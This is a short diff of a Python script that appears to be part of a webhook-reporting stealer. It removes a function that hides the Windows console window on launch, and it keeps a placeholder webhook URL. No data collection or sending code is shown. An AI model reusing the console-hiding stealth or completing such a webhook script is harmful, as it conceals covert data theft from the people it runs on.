@@ -3,13 +3,6 @@ import re
 import json
 from urllib.request import Request, urlopen
 
-def hidewindow():
-    import win32console,win32gui
-    window = win32console.GetConsoleWindow()
-    win32gui.ShowWindow(window,0)
-    return True
-hidewindow()
-
 WEBHOOK_URL = 'WEBHOOK HERE' # PUT WEBHOOK HERE
 
 PING_ME = False
